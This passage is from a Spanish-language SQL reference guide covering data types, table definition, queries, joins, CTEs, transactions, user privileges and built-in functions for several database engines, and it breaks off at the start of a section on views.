# SQL — Referencia Completa

Guía exhaustiva de SQL cubriendo desde fundamentos hasta técnicas avanzadas, con ejemplos prácticos, diferencias entre motores y aplicaciones en pentesting/seguridad.

---

## 1. Fundamentos y Clasificación de SQL

**SQL (Structured Query Language)** es el lenguaje estándar para gestionar bases de datos relacionales. Se divide en sublenguajes:

| Sublenguaje | Siglas | Operaciones | Propósito |
|---|---|---|---|
| Data Definition Language | DDL | CREATE, ALTER, DROP, TRUNCATE | Estructura de objetos |
| Data Manipulation Language | DML | SELECT, INSERT, UPDATE, DELETE | Datos |
| Data Control Language | DCL | GRANT, REVOKE | Permisos y acceso |
| Transaction Control Language | TCL | COMMIT, ROLLBACK, SAVEPOINT | Control de transacciones |

---

## 2. Tipos de Datos

### Tipos Numéricos

| Tipo | Descripción | Rango |
|---|---|---|
| `TINYINT` | Entero muy pequeño | 0 a 255 (sin signo) / -128 a 127 |
| `SMALLINT` | Entero pequeño | -32,768 a 32,767 |
| `INT` / `INTEGER` | Entero estándar | -2,147,483,648 a 2,147,483,647 |
| `BIGINT` | Entero grande | ±9.2 × 10^18 |
| `DECIMAL(p,s)` | Decimal exacto | p = dígitos totales, s = decimales |
| `NUMERIC(p,s)` | Equivalente a DECIMAL | Mismo comportamiento |
| `FLOAT` | Coma flotante | Aprox. 7 decimales significativos |
| `DOUBLE` | Coma flotante doble | Aprox. 15 decimales significativos |
| `REAL` | Coma flotante simple | Alias de FLOAT en muchos motores |

### Tipos de Cadena

| Tipo | Descripción | Uso |
|---|---|---|
| `CHAR(n)` | Longitud **fija** de n caracteres | Códigos, estados (rellenan con espacios) |
| `VARCHAR(n)` | Longitud **variable** hasta n | Nombres, descripciones |
| `TEXT` | Texto largo sin límite práctico | Contenido, artículos |
| `NCHAR(n)` | CHAR con soporte Unicode | Texto internacional |
| `NVARCHAR(n)` | VARCHAR con soporte Unicode | Texto internacional variable |
| `NTEXT` | TEXT con soporte Unicode | SQL Server legacy |

### Tipos de Fecha y Hora

| Tipo | Descripción | Ejemplo |
|---|---|---|
| `DATE` | Solo fecha | `2025-06-09` |
| `TIME` | Solo hora | `14:30:00` |
| `DATETIME` | Fecha y hora | `2025-06-09 14:30:00` |
| `TIMESTAMP` | Fecha/hora con zona horaria | `2025-06-09 14:30:00+02:00` |
| `YEAR` | Solo año (MySQL) | `2025` |
| `INTERVAL` | Duración | `INTERVAL '1 YEAR 2 MONTHS'` |

### Tipos Especiales

| Tipo | Descripción |
|---|---|
| `BOOLEAN` | `TRUE` / `FALSE` / `NULL` |
| `BINARY(n)` | Datos binarios de longitud fija |
| `VARBINARY(n)` | Datos binarios de longitud variable |
| `BLOB` | Binary Large Object (imágenes, archivos) |
| `JSON` | Datos JSON nativos (MySQL 5.7+, PostgreSQL 9.2+) |
| `UUID` | Identificador único universal |
| `ENUM` | Enumeración de valores permitidos |

---

## 3. DDL — Definición de Estructuras

### CREATE DATABASE / TABLE

```sql
-- Crear base de datos
CREATE DATABASE empresa;
CREATE DATABASE empresa
    CHARACTER SET utf8mb4
    COLLATE utf8mb4_unicode_ci;

USE empresa;  -- Seleccionar base de datos (MySQL)
-- En PostgreSQL: \c empresa

-- Crear tabla básica
CREATE TABLE empleados (
    id          INT             PRIMARY KEY AUTO_INCREMENT,
    nombre      VARCHAR(100)    NOT NULL,
    apellido    VARCHAR(100)    NOT NULL,
    email       VARCHAR(255)    UNIQUE NOT NULL,
    salario     DECIMAL(10, 2)  DEFAULT 0.00,
    fecha_alta  DATE            NOT NULL DEFAULT (CURRENT_DATE),
    activo      BOOLEAN         DEFAULT TRUE,
    depto_id    INT,
    FOREIGN KEY (depto_id) REFERENCES departamentos(id) ON DELETE SET NULL
);

-- Tabla con clave primaria compuesta
CREATE TABLE matriculas (
    alumno_id   INT,
    curso_id    INT,
    fecha       DATE,
    nota        DECIMAL(4,2),
    PRIMARY KEY (alumno_id, curso_id),
    FOREIGN KEY (alumno_id) REFERENCES alumnos(id),
    FOREIGN KEY (curso_id)  REFERENCES cursos(id)
);
```

### Restricciones (Constraints)

```sql
CREATE TABLE productos (
    id          INT             NOT NULL,
    nombre      VARCHAR(200)    NOT NULL,
    precio      DECIMAL(10,2)   NOT NULL,
    stock       INT             DEFAULT 0,
    categoria   VARCHAR(50),

    -- Restricciones a nivel de columna
    CONSTRAINT pk_productos     PRIMARY KEY (id),
    CONSTRAINT uq_nombre        UNIQUE (nombre),
    CONSTRAINT ck_precio        CHECK (precio >= 0),
    CONSTRAINT ck_stock         CHECK (stock >= 0),
    CONSTRAINT fk_categoria     FOREIGN KEY (categoria_id) REFERENCES categorias(id)
                                    ON DELETE RESTRICT
                                    ON UPDATE CASCADE
);

-- Opciones de acción referencial en FK:
-- ON DELETE CASCADE       → borra los hijos cuando se borra el padre
-- ON DELETE SET NULL      → pone NULL en los hijos
-- ON DELETE RESTRICT      → impide borrar si hay hijos (por defecto)
-- ON DELETE NO ACTION     → como RESTRICT pero se evalúa al final de la transacción
-- ON UPDATE CASCADE       → propaga el cambio del PK a los FK
```

### ALTER TABLE

```sql
-- Añadir columna
ALTER TABLE empleados ADD COLUMN telefono VARCHAR(20);
ALTER TABLE empleados ADD COLUMN edad INT AFTER apellido;
ALTER TABLE empleados ADD COLUMN codigo CHAR(10) FIRST;

-- Modificar columna
ALTER TABLE empleados MODIFY COLUMN nombre VARCHAR(200) NOT NULL;
ALTER TABLE empleados ALTER COLUMN nombre TYPE VARCHAR(200);  -- PostgreSQL
ALTER TABLE empleados RENAME COLUMN nombre TO nombre_completo;

-- Eliminar columna
ALTER TABLE empleados DROP COLUMN telefono;

-- Añadir/eliminar restricciones
ALTER TABLE empleados ADD CONSTRAINT uq_email UNIQUE (email);
ALTER TABLE empleados DROP INDEX uq_email;         -- MySQL
ALTER TABLE empleados DROP CONSTRAINT uq_email;    -- PostgreSQL / SQL Server

ALTER TABLE empleados ADD CONSTRAINT fk_depto
    FOREIGN KEY (depto_id) REFERENCES departamentos(id);
ALTER TABLE empleados DROP FOREIGN KEY fk_depto;   -- MySQL
ALTER TABLE empleados DROP CONSTRAINT fk_depto;    -- PostgreSQL

-- Renombrar tabla
RENAME TABLE empleados TO trabajadores;            -- MySQL
ALTER TABLE empleados RENAME TO trabajadores;      -- PostgreSQL
```

### DROP y TRUNCATE

```sql
-- Eliminar tabla
DROP TABLE empleados;
DROP TABLE IF EXISTS empleados;          -- Sin error si no existe
DROP TABLE empleados CASCADE;            -- PostgreSQL: elimina también objetos dependientes
DROP TABLE empleados RESTRICT;           -- Falla si hay dependencias

-- Truncar (vaciar tabla manteniendo estructura)
TRUNCATE TABLE empleados;
TRUNCATE TABLE empleados RESTART IDENTITY;  -- PostgreSQL: resetea secuencias

-- Diferencias DROP vs TRUNCATE vs DELETE:
-- DROP:     elimina tabla + datos + estructura (DDL, no rollback en algunos motores)
-- TRUNCATE: elimina todos los datos, resetea identidad (DDL, más rápido que DELETE)
-- DELETE:   elimina filas específicas (DML, transaccional, con WHERE)

-- Eliminar base de datos
DROP DATABASE empresa;
DROP DATABASE IF EXISTS empresa;
```

### ÍNDICES

```sql
-- Crear índice simple
CREATE INDEX idx_apellido ON empleados (apellido);

-- Índice único
CREATE UNIQUE INDEX idx_email ON empleados (email);

-- Índice compuesto (cuando se filtran múltiples columnas)
CREATE INDEX idx_nombre_depto ON empleados (apellido, depto_id);

-- Índice de texto completo (MySQL)
CREATE FULLTEXT INDEX idx_descripcion ON productos (descripcion);

-- Índice en PostgreSQL con método específico
CREATE INDEX idx_nombre ON empleados USING btree (nombre);
CREATE INDEX idx_json ON documentos USING gin (datos_json);

-- Ver índices
SHOW INDEX FROM empleados;              -- MySQL
SELECT * FROM pg_indexes WHERE tablename = 'empleados';  -- PostgreSQL

-- Eliminar índice
DROP INDEX idx_apellido ON empleados;   -- MySQL
DROP INDEX idx_apellido;                -- PostgreSQL

-- Cuándo crear índices:
-- ✓ Columnas en WHERE frecuentes
-- ✓ Columnas en JOIN
-- ✓ Columnas en ORDER BY / GROUP BY
-- ✗ Tablas pequeñas (overhead no justificado)
-- ✗ Columnas con muchos NULLs o baja cardinalidad
-- ✗ Tablas con muchos INSERT/UPDATE (degradan escritura)
```

---

## 4. DML — Manipulación de Datos

### SELECT — Consultas

```sql
-- Sintaxis completa
SELECT [DISTINCT] columnas
FROM tabla
[JOIN otras_tablas ON condicion]
[WHERE condicion]
[GROUP BY columnas]
[HAVING condicion_de_grupo]
[ORDER BY columnas [ASC|DESC]]
[LIMIT n OFFSET m];

-- Básico
SELECT * FROM empleados;
SELECT nombre, apellido, salario FROM empleados;
SELECT nombre AS nombre_completo, salario * 12 AS salario_anual FROM empleados;
SELECT DISTINCT departamento FROM empleados;    -- Sin duplicados
```

### WHERE — Filtrado

```sql
-- Operadores de comparación
SELECT * FROM empleados WHERE salario > 50000;
SELECT * FROM empleados WHERE salario BETWEEN 30000 AND 60000;
SELECT * FROM empleados WHERE nombre = 'Alice';
SELECT * FROM empleados WHERE nombre != 'Bob';
SELECT * FROM empleados WHERE nombre <> 'Bob';     -- Equivalente a !=

-- Operadores lógicos
SELECT * FROM empleados WHERE depto_id = 1 AND salario > 40000;
SELECT * FROM empleados WHERE depto_id = 1 OR depto_id = 2;
SELECT * FROM empleados WHERE NOT activo = TRUE;

-- IN / NOT IN
SELECT * FROM empleados WHERE depto_id IN (1, 2, 3);
SELECT * FROM empleados WHERE depto_id NOT IN (SELECT id FROM departamentos WHERE activo = FALSE);

-- LIKE — búsqueda de patrones
SELECT * FROM empleados WHERE nombre LIKE 'Al%';     -- Empieza por "Al"
SELECT * FROM empleados WHERE nombre LIKE '%ice';    -- Termina en "ice"
SELECT * FROM empleados WHERE nombre LIKE '%ali%';   -- Contiene "ali"
SELECT * FROM empleados WHERE nombre LIKE '_lice';   -- Exactamente 5 chars, termina en "lice"
SELECT * FROM empleados WHERE nombre LIKE '[ABC]%';  -- Empieza por A, B o C (SQL Server)

-- IS NULL / IS NOT NULL
SELECT * FROM empleados WHERE depto_id IS NULL;
SELECT * FROM empleados WHERE depto_id IS NOT NULL;

-- Operadores de comparación con NULL
-- NUNCA uses = NULL; siempre IS NULL / IS NOT NULL
```

### ORDER BY y LIMIT

```sql
SELECT * FROM empleados ORDER BY salario DESC;
SELECT * FROM empleados ORDER BY apellido ASC, nombre ASC;  -- Multi-columna
SELECT * FROM empleados ORDER BY 3;                          -- Por número de columna

-- LIMIT (MySQL, PostgreSQL, SQLite)
SELECT * FROM empleados ORDER BY salario DESC LIMIT 10;      -- Top 10
SELECT * FROM empleados ORDER BY salario DESC LIMIT 10 OFFSET 20;  -- Página 3 de 10

-- TOP (SQL Server)
SELECT TOP 10 * FROM empleados ORDER BY salario DESC;
SELECT TOP 10 PERCENT * FROM empleados ORDER BY salario DESC;  -- 10% de las filas

-- FETCH FIRST (estándar SQL, soportado por varios motores)
SELECT * FROM empleados ORDER BY salario DESC FETCH FIRST 10 ROWS ONLY;
```

### Funciones de Agregación

```sql
SELECT COUNT(*) FROM empleados;                        -- Total de filas
SELECT COUNT(DISTINCT depto_id) FROM empleados;        -- Valores únicos
SELECT COUNT(telefono) FROM empleados;                 -- Excluye NULLs
SELECT SUM(salario) FROM empleados;
SELECT AVG(salario) FROM empleados;
SELECT MAX(salario) FROM empleados;
SELECT MIN(salario) FROM empleados;
SELECT STDDEV(salario) FROM empleados;                 -- Desviación estándar
SELECT VARIANCE(salario) FROM empleados;               -- Varianza

-- Con GROUP BY
SELECT depto_id, COUNT(*) AS total, AVG(salario) AS salario_medio
FROM empleados
GROUP BY depto_id;

-- Con HAVING (filtra después de agrupar)
SELECT depto_id, COUNT(*) AS total, AVG(salario) AS salario_medio
FROM empleados
GROUP BY depto_id
HAVING COUNT(*) > 5 AND AVG(salario) > 40000;

-- Diferencia WHERE vs HAVING:
-- WHERE: filtra filas ANTES de agrupar
-- HAVING: filtra grupos DESPUÉS de agrupar
```

### GROUP BY avanzado

```sql
-- ROLLUP — subtotales y total general
SELECT depto_id, YEAR(fecha_alta), COUNT(*), SUM(salario)
FROM empleados
GROUP BY ROLLUP (depto_id, YEAR(fecha_alta));

-- CUBE — todas las combinaciones posibles de subtotales
SELECT depto_id, YEAR(fecha_alta), COUNT(*)
FROM empleados
GROUP BY CUBE (depto_id, YEAR(fecha_alta));

-- GROUPING SETS — subconjuntos específicos
SELECT depto_id, puesto, COUNT(*)
FROM empleados
GROUP BY GROUPING SETS ((depto_id), (puesto), ());

-- Window functions (funciones de ventana)
SELECT
    nombre,
    salario,
    depto_id,
    AVG(salario) OVER (PARTITION BY depto_id) AS avg_depto,
    RANK() OVER (PARTITION BY depto_id ORDER BY salario DESC) AS rango_en_depto,
    ROW_NUMBER() OVER (ORDER BY salario DESC) AS ranking_global,
    LAG(salario, 1) OVER (ORDER BY fecha_alta) AS salario_anterior,
    LEAD(salario, 1) OVER (ORDER BY fecha_alta) AS salario_siguiente,
    SUM(salario) OVER (ORDER BY fecha_alta ROWS UNBOUNDED PRECEDING) AS acumulado
FROM empleados;
```

### JOINs — Uniones entre tablas

```sql
-- INNER JOIN — solo las filas que coinciden en ambas tablas
SELECT e.nombre, e.salario, d.nombre AS departamento
FROM empleados e
INNER JOIN departamentos d ON e.depto_id = d.id;

-- LEFT JOIN — todas las filas de la izquierda, NULL en la derecha si no hay coincidencia
SELECT e.nombre, d.nombre AS departamento
FROM empleados e
LEFT JOIN departamentos d ON e.depto_id = d.id;

-- RIGHT JOIN — todas las filas de la derecha
SELECT e.nombre, d.nombre AS departamento
FROM empleados e
RIGHT JOIN departamentos d ON e.depto_id = d.id;

-- FULL OUTER JOIN — todas las filas de ambas tablas
SELECT e.nombre, d.nombre AS departamento
FROM empleados e
FULL OUTER JOIN departamentos d ON e.depto_id = d.id;

-- CROSS JOIN — producto cartesiano (todas las combinaciones)
SELECT e.nombre, p.nombre AS proyecto
FROM empleados e
CROSS JOIN proyectos p;

-- SELF JOIN — unir una tabla consigo misma
SELECT e.nombre AS empleado, m.nombre AS manager
FROM empleados e
LEFT JOIN empleados m ON e.manager_id = m.id;

-- Múltiples JOINs
SELECT e.nombre, d.nombre AS depto, p.nombre AS proyecto, ep.horas
FROM empleados e
INNER JOIN departamentos d     ON e.depto_id = d.id
LEFT JOIN  empleado_proyecto ep ON e.id = ep.empleado_id
LEFT JOIN  proyectos p         ON ep.proyecto_id = p.id
WHERE e.activo = TRUE;

-- Filtrar filas huérfanas (sin correspondencia)
SELECT e.nombre
FROM empleados e
LEFT JOIN departamentos d ON e.depto_id = d.id
WHERE d.id IS NULL;   -- Empleados sin departamento asignado
```

### Subconsultas

```sql
-- Subconsulta escalar (devuelve un valor)
SELECT nombre, salario
FROM empleados
WHERE salario > (SELECT AVG(salario) FROM empleados);

-- Subconsulta en el FROM (tabla derivada)
SELECT depto_id, avg_salario
FROM (
    SELECT depto_id, AVG(salario) AS avg_salario
    FROM empleados
    GROUP BY depto_id
) AS resumen_deptos
WHERE avg_salario > 45000;

-- Subconsulta correlacionada (referencia a la consulta exterior)
SELECT nombre, salario
FROM empleados e
WHERE salario > (
    SELECT AVG(salario)
    FROM empleados
    WHERE depto_id = e.depto_id   -- Referencia al empleado exterior
);

-- EXISTS / NOT EXISTS
SELECT nombre FROM empleados e
WHERE EXISTS (
    SELECT 1 FROM proyectos p
    WHERE p.lider_id = e.id
);

SELECT nombre FROM empleados e
WHERE NOT EXISTS (
    SELECT 1 FROM empleado_proyecto ep
    WHERE ep.empleado_id = e.id
);

-- ANY / ALL
SELECT nombre FROM empleados
WHERE salario > ANY (SELECT salario FROM empleados WHERE depto_id = 2);
-- ANY: mayor que al menos uno (= mayor que el mínimo del depto 2)

SELECT nombre FROM empleados
WHERE salario > ALL (SELECT salario FROM empleados WHERE depto_id = 2);
-- ALL: mayor que todos (= mayor que el máximo del depto 2)
```

### CTEs — Common Table Expressions

```sql
-- CTE básica (más legible que subconsultas)
WITH empleados_senior AS (
    SELECT * FROM empleados
    WHERE DATEDIFF(YEAR, fecha_alta, CURRENT_DATE) > 5
)
SELECT * FROM empleados_senior WHERE salario > 50000;

-- Múltiples CTEs
WITH
    senior AS (
        SELECT * FROM empleados WHERE DATEDIFF(YEAR, fecha_alta, CURRENT_DATE) > 5
    ),
    alto_salario AS (
        SELECT * FROM empleados WHERE salario > 60000
    )
SELECT s.nombre, s.salario
FROM senior s
INNER JOIN alto_salario a ON s.id = a.id;

-- CTE recursiva (jerarquías: org charts, árboles, grafos)
WITH RECURSIVE jerarquia AS (
    -- Caso base: el CEO (sin manager)
    SELECT id, nombre, manager_id, 0 AS nivel
    FROM empleados
    WHERE manager_id IS NULL

    UNION ALL

    -- Caso recursivo: empleados del nivel anterior
    SELECT e.id, e.nombre, e.manager_id, j.nivel + 1
    FROM empleados e
    INNER JOIN jerarquia j ON e.manager_id = j.id
)
SELECT nivel, nombre FROM jerarquia ORDER BY nivel, nombre;
```

### INSERT

```sql
-- Insertar una fila
INSERT INTO empleados (nombre, apellido, email, salario, depto_id)
VALUES ('Alice', 'García', 'alice@empresa.com', 45000.00, 1);

-- Insertar múltiples filas de una vez
INSERT INTO empleados (nombre, apellido, email, salario, depto_id)
VALUES
    ('Bob', 'Martínez', 'bob@empresa.com', 50000.00, 2),
    ('Carol', 'López', 'carol@empresa.com', 55000.00, 1),
    ('David', 'Sánchez', 'david@empresa.com', 48000.00, 3);

-- Insertar desde SELECT
INSERT INTO empleados_archivo (nombre, apellido, email, salario)
SELECT nombre, apellido, email, salario
FROM empleados
WHERE activo = FALSE AND fecha_alta < '2020-01-01';

-- INSERT OR REPLACE / UPSERT
INSERT OR REPLACE INTO empleados (id, nombre, email)
VALUES (1, 'Alice Actualizada', 'alice_new@empresa.com');  -- SQLite

-- UPSERT en PostgreSQL
INSERT INTO empleados (id, nombre, email, salario)
VALUES (1, 'Alice', 'alice@empresa.com', 45000)
ON CONFLICT (id) DO UPDATE
SET nombre = EXCLUDED.nombre,
    email = EXCLUDED.email,
    salario = EXCLUDED.salario;

-- INSERT IGNORE (MySQL — ignora errores de clave duplicada)
INSERT IGNORE INTO empleados (nombre, email) VALUES ('Alice', 'alice@empresa.com');
```

### UPDATE

```sql
-- Actualizar una columna
UPDATE empleados SET salario = 55000.00 WHERE id = 1;

-- Actualizar múltiples columnas
UPDATE empleados
SET salario = salario * 1.10,
    activo = TRUE
WHERE depto_id = 1 AND YEAR(fecha_alta) < 2020;

-- Update con subquery
UPDATE empleados
SET depto_id = (SELECT id FROM departamentos WHERE nombre = 'IT')
WHERE depto_id IS NULL;

-- Update con JOIN (MySQL)
UPDATE empleados e
INNER JOIN departamentos d ON e.depto_id = d.id
SET e.salario = e.salario * 1.15
WHERE d.nombre = 'Ventas';

-- Update con CTE (PostgreSQL / SQL Server)
WITH incremento AS (
    SELECT id FROM empleados
    WHERE depto_id = 1 AND activo = TRUE
)
UPDATE empleados
SET salario = salario * 1.10
WHERE id IN (SELECT id FROM incremento);
```

### DELETE

```sql
-- Borrar filas específicas
DELETE FROM empleados WHERE id = 1;
DELETE FROM empleados WHERE depto_id = 5 AND activo = FALSE;

-- Borrar con subquery
DELETE FROM empleados
WHERE depto_id IN (SELECT id FROM departamentos WHERE activo = FALSE);

-- DELETE con JOIN (MySQL)
DELETE e
FROM empleados e
INNER JOIN departamentos d ON e.depto_id = d.id
WHERE d.nombre = 'Temporal';

-- TRUNCATE vs DELETE:
TRUNCATE TABLE logs_antiguos;          -- Rápido, no registra cada fila, resetea autoincremento
DELETE FROM logs_antiguos;             -- Lento en tablas grandes, transaccional, preserva autoincremento
DELETE FROM logs_antiguos WHERE fecha < '2020-01-01';  -- Con condición

-- Soft delete (marcar como borrado, sin eliminar físicamente)
ALTER TABLE empleados ADD COLUMN eliminado_at TIMESTAMP NULL;
UPDATE empleados SET eliminado_at = NOW() WHERE id = 1;
SELECT * FROM empleados WHERE eliminado_at IS NULL;  -- Solo "activos"
```

---

## 5. DCL — Control de Acceso

```sql
-- Crear usuario
CREATE USER 'alice'@'localhost' IDENTIFIED BY 'ContraseñaSegura!';     -- MySQL
CREATE USER 'alice'@'%' IDENTIFIED BY 'ContraseñaSegura!';             -- Cualquier host
CREATE USER alice WITH PASSWORD 'ContraseñaSegura!';                    -- PostgreSQL

-- Ver usuarios (MySQL)
SELECT user, host FROM mysql.user;

-- Otorgar privilegios
GRANT SELECT ON empresa.* TO 'alice'@'localhost';                       -- Solo lectura en empresa
GRANT SELECT, INSERT, UPDATE ON empresa.empleados TO 'alice'@'%';       -- DML en una tabla
GRANT ALL PRIVILEGES ON empresa.* TO 'alice'@'localhost';               -- Todo en empresa
GRANT ALL PRIVILEGES ON *.* TO 'alice'@'localhost';                     -- Todo en todo (PELIGROSO)
GRANT ALL PRIVILEGES ON empresa.* TO 'alice'@'localhost' WITH GRANT OPTION;  -- Puede dar permisos a otros

-- Ver privilegios
SHOW GRANTS FOR 'alice'@'localhost';          -- MySQL
\du alice                                      -- PostgreSQL

-- Revocar privilegios
REVOKE SELECT ON empresa.* FROM 'alice'@'localhost';
REVOKE ALL PRIVILEGES ON empresa.* FROM 'alice'@'localhost';
REVOKE GRANT OPTION FOR SELECT ON empresa.* FROM 'alice'@'localhost';

-- Refrescar privilegios (MySQL)
FLUSH PRIVILEGES;

-- Cambiar contraseña
ALTER USER 'alice'@'localhost' IDENTIFIED BY 'NuevaContraseña!';  -- MySQL 8+
ALTER USER alice PASSWORD 'NuevaContraseña!';                       -- PostgreSQL

-- Eliminar usuario
DROP USER 'alice'@'localhost';
DROP USER IF EXISTS 'alice'@'localhost';

-- Roles (MySQL 8+, PostgreSQL)
CREATE ROLE readonly_role;
GRANT SELECT ON empresa.* TO readonly_role;
GRANT readonly_role TO 'alice'@'localhost';
REVOKE readonly_role FROM 'alice'@'localhost';
```

---

## 6. TCL — Control de Transacciones

```sql
-- Inicio de transacción explícita
START TRANSACTION;                  -- MySQL
BEGIN;                              -- PostgreSQL / SQLite
BEGIN TRANSACTION;                  -- SQL Server

-- Confirmar cambios
COMMIT;

-- Deshacer cambios
ROLLBACK;

-- Puntos de guardado
SAVEPOINT sp_nombre;
ROLLBACK TO SAVEPOINT sp_nombre;
RELEASE SAVEPOINT sp_nombre;

-- Ejemplo completo: transferencia bancaria
START TRANSACTION;

UPDATE cuentas SET saldo = saldo - 1000 WHERE id = 1;
UPDATE cuentas SET saldo = saldo + 1000 WHERE id = 2;

-- Verificar que el saldo no es negativo
SELECT saldo INTO @saldo FROM cuentas WHERE id = 1;
IF @saldo < 0 THEN
    ROLLBACK;
ELSE
    COMMIT;
END IF;

-- Propiedades ACID:
-- Atomicidad: todo o nada — si falla una operación, se revierte todo
-- Consistencia: la BD pasa de un estado válido a otro estado válido
-- Aislamiento: las transacciones concurrentes no se afectan entre sí
-- Durabilidad: los cambios confirmados persisten aunque falle el sistema

-- Niveles de aislamiento (de menor a mayor)
SET TRANSACTION ISOLATION LEVEL READ UNCOMMITTED;  -- Lee datos sin confirmar (dirty reads)
SET TRANSACTION ISOLATION LEVEL READ COMMITTED;    -- Solo datos confirmados (por defecto en PG)
SET TRANSACTION ISOLATION LEVEL REPEATABLE READ;   -- Mismos datos si re-lees (por defecto MySQL)
SET TRANSACTION ISOLATION LEVEL SERIALIZABLE;      -- Total aislamiento, más lento
```

---

## 7. Funciones Integradas

### Funciones de Texto

```sql
-- Longitud
LENGTH('Hola')                  -- 4 (bytes)
CHAR_LENGTH('Hola')             -- 4 (caracteres, correcto con Unicode)

-- Transformación de mayúsculas
UPPER('hola')                   -- 'HOLA'
LOWER('HOLA')                   -- 'hola'

-- Recortar espacios
TRIM('  hola  ')                -- 'hola'
LTRIM('  hola  ')               -- 'hola  '
RTRIM('  hola  ')               -- '  hola'
TRIM(BOTH 'x' FROM 'xxholaxx')  -- 'hola'

-- Subcadenas
SUBSTRING('Hola Mundo', 6, 5)   -- 'Mundo'
SUBSTR('Hola Mundo', 6, 5)      -- Equivalente
LEFT('Hola Mundo', 4)           -- 'Hola'
RIGHT('Hola Mundo', 5)          -- 'Mundo'

-- Búsqueda y reemplazo
INSTR('Hola Mundo', 'Mundo')    -- 6 (posición, MySQL)
POSITION('Mundo' IN 'Hola Mundo')  -- 6 (estándar SQL)
REPLACE('Hola Mundo', 'Mundo', 'SQL')  -- 'Hola SQL'
REGEXP_REPLACE('abc123', '[0-9]+', 'NUM')  -- 'abcNUM'

-- Concatenación
CONCAT('Hola', ' ', 'Mundo')    -- 'Hola Mundo'
CONCAT_WS(', ', 'a', 'b', 'c') -- 'a, b, c' (With Separator)
'Hola' || ' ' || 'Mundo'       -- PostgreSQL, SQLite

-- Repetición y relleno
REPEAT('ab', 3)                 -- 'ababab'
LPAD('5', 3, '0')               -- '005'
RPAD('5', 3, '0')               -- '500'

-- Inverso
REVERSE('Hola')                 -- 'aloH'

-- Extracción de patrones
REGEXP_SUBSTR('Email: test@test.com', '[a-z]+@[a-z]+\.[a-z]+')  -- 'test@test.com'
```

### Funciones de Fecha y Hora

```sql
-- Fecha y hora actual
NOW()                           -- Fecha y hora actual del servidor
CURRENT_TIMESTAMP               -- Equivalente estándar
CURRENT_DATE                    -- Solo fecha actual
CURRENT_TIME                    -- Solo hora actual
SYSDATE()                       -- Como NOW() pero no se congela en transacción (MySQL)

-- Extracción de componentes
YEAR('2025-06-09')              -- 2025
MONTH('2025-06-09')             -- 6
DAY('2025-06-09')               -- 9
HOUR('14:30:00')                -- 14
MINUTE('14:30:00')              -- 30
SECOND('14:30:00')              -- 0
DAYOFWEEK('2025-06-09')         -- 2 (lunes=2 en MySQL, domingo=1)
DAYOFYEAR('2025-06-09')         -- 160
WEEK('2025-06-09')              -- Número de semana del año
QUARTER('2025-06-09')           -- 2

EXTRACT(YEAR FROM '2025-06-09')  -- Estándar SQL: YEAR, MONTH, DAY, HOUR, MINUTE, SECOND

-- Manipulación de fechas
DATE_ADD('2025-06-09', INTERVAL 30 DAY)       -- 2025-07-09
DATE_ADD('2025-06-09', INTERVAL 2 MONTH)      -- 2025-08-09
DATE_SUB('2025-06-09', INTERVAL 1 YEAR)       -- 2024-06-09
'2025-06-09'::DATE + INTERVAL '30 days'       -- PostgreSQL

-- Diferencias entre fechas
DATEDIFF('2025-12-31', '2025-06-09')          -- 205 días (MySQL)
DATE_PART('day', '2025-12-31'::DATE - '2025-06-09'::DATE)  -- PostgreSQL
AGE('2025-12-31', '2025-06-09')               -- PostgreSQL: '6 mons 22 days'

-- Formato de fechas
DATE_FORMAT(NOW(), '%Y-%m-%d %H:%i:%s')       -- MySQL: '2025-06-09 14:30:00'
TO_CHAR(NOW(), 'YYYY-MM-DD HH24:MI:SS')       -- PostgreSQL
FORMAT(GETDATE(), 'yyyy-MM-dd HH:mm:ss')      -- SQL Server

-- Conversión de texto a fecha
STR_TO_DATE('09/06/2025', '%d/%m/%Y')         -- MySQL
TO_DATE('09/06/2025', 'DD/MM/YYYY')           -- PostgreSQL / Oracle
CAST('2025-06-09' AS DATE)                    -- Estándar

-- Timestamp Unix
UNIX_TIMESTAMP()                              -- Segundos desde 1970-01-01 (MySQL)
UNIX_TIMESTAMP('2025-06-09 00:00:00')
FROM_UNIXTIME(1749427200)                     -- Timestamp Unix → DATETIME (MySQL)
EXTRACT(EPOCH FROM NOW())                     -- PostgreSQL
```

### Funciones Numéricas

```sql
ROUND(3.14159, 2)               -- 3.14
ROUND(3.14159, 0)               -- 3
CEILING(3.1)                    -- 4 (redondeo hacia arriba)
CEIL(3.1)                       -- Equivalente
FLOOR(3.9)                      -- 3 (redondeo hacia abajo)
TRUNCATE(3.99, 1)               -- 3.9 (trunca sin redondear)

ABS(-42)                        -- 42 (valor absoluto)
MOD(10, 3)                      -- 1 (módulo / resto)
10 % 3                          -- Equivalente en muchos motores
POWER(2, 10)                    -- 1024
POW(2, 10)                      -- Equivalente
SQRT(144)                       -- 12
EXP(1)                          -- 2.71828... (e^1)
LOG(100)                        -- Logaritmo natural
LOG10(100)                      -- 2 (logaritmo base 10)
LOG2(8)                         -- 3 (logaritmo base 2)

PI()                            -- 3.14159...
SIN(PI()/2)                     -- 1
COS(0)                          -- 1
RAND()                          -- Número aleatorio entre 0 y 1
RAND() * (100 - 1) + 1          -- Aleatorio entre 1 y 100

SIGN(-5)                        -- -1; SIGN(0)=0; SIGN(5)=1
GREATEST(1, 5, 3, 9, 2)         -- 9
LEAST(1, 5, 3, 9, 2)            -- 1
```

### Funciones de Control de Flujo

```sql
-- IF (MySQL)
IF(salario > 50000, 'Alto', 'Normal')
IF(activo = TRUE, 'Activo', 'Inactivo')

-- IFNULL / COALESCE (tratar NULLs)
IFNULL(telefono, 'Sin teléfono')             -- MySQL: si NULL, devuelve segundo arg
COALESCE(telefono, movil, email, 'Sin contacto')  -- Estándar: primer no-NULL

-- NULLIF (devuelve NULL si ambos son iguales)
NULLIF(precio_oferta, precio_normal)         -- NULL si no hay descuento

-- CASE WHEN (el más potente y estándar)
SELECT nombre,
    CASE
        WHEN salario < 25000 THEN 'Junior'
        WHEN salario BETWEEN 25000 AND 50000 THEN 'Mid'
        WHEN salario BETWEEN 50001 AND 80000 THEN 'Senior'
        ELSE 'Principal'
    END AS nivel
FROM empleados;

-- CASE con valor (como switch)
SELECT nombre,
    CASE depto_id
        WHEN 1 THEN 'IT'
        WHEN 2 THEN 'RRHH'
        WHEN 3 THEN 'Ventas'
        ELSE 'Otro'
    END AS departamento
FROM empleados;

-- IIF (SQL Server)
IIF(salario > 50000, 'Alto', 'Normal')

-- DECODE (Oracle)
DECODE(depto_id, 1, 'IT', 2, 'RRHH', 'Otro')
```

---

## 8. Vistas, Procedimientos y Triggers

### Vistas (VIEWS)

```sql
-- Crear vista
CREATE VIEW vista_empleados_activos AS
